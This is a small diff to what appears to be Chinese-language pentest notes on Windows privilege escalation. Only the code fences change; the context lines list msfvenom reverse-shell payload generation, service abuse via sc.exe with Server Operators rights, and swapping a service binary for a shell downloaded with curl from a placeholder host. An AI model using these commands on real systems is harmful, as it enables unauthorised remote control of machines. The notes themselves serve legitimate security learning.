@@ -446,7 +446,8 @@ iscacls E:\mysql\bin\mysql.exe
 # R - 只读
 # W - 只写
 # 3D - 删除
---------------------------------------------------------------
+```
+```bash
 那么如何提权
 1. msfvenom -p windows/shell_reverse_tcp LHOST=ip LPORT=port -f exe > shell.exe
 2. upload shell.exe(evil下使用)
@@ -456,7 +457,8 @@ iscacls E:\mysql\bin\mysql.exe
 5. sc.exe start vss
 # 这里需要你有可以停止和启动的权限(server operators)
 # vss是默认包含服务，这里的vss就是你有权限停止或开始的项目
--------------------------------------------------------------
+```
+```bash
 # 如果有权利shutdown，那么可以将此exe文件替换成反弹shell文件，最后shutdown -r
 rename bd.exe bd.exe.bak
 curl http://ip:port/shell.exe -o bd.exe
